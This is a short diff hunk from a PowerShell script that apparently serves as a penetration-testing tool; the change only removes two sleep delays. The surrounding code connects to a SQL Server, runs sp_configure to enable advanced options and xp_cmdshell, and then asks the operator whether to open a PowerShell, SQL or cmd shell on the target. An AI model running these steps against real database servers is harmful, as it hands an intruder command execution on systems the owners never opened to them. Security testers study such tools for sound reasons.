@@ -68,10 +68,8 @@ http://www.truesec.com
     }
   
     "Connecting to $ComputerName..." 
-    start-sleep 3 
     Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
     "`nEnabling XP_CMDSHELL...`n"
-    start-sleep 3
     Make-Connection "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
     write-host -NoNewline "Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): "
     $shell = read-host
